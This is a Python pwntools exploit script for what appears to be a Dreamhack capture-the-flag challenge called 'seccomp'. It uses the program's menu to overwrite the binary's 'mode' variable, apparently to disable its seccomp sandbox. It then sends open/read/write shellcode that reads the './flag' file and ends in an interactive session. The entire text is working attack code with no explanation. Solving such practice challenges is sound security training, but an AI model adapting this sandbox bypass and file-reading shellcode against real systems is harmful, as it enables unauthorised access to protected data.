from pwn import *
p = remote('host3.dreamhack.games', 18116)
e = ELF('./seccomp')
context.arch = 'amd64' 

mode_addr = e.symbols['mode']
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'addr: ', str(mode_addr).encode())
p.sendlineafter(b'value: ', b'2')

p.sendlineafter(b'> ', b'1')
shellcode = ''
shellcode += shellcraft.open('./flag', 0)
shellcode += '''
    mov rbx, rax
'''
shellcode += shellcraft.read('rbx', 'rsp', 0x100)
shellcode += '''
    mov rdx, rax
'''
shellcode += shellcraft.write(1, 'rsp', 'rdx')
shellcode += shellcraft.exit(0)
p.sendafter(b'shellcode: ', asm(shellcode))
p.sendlineafter(b'> ', b'2')

p.interactive()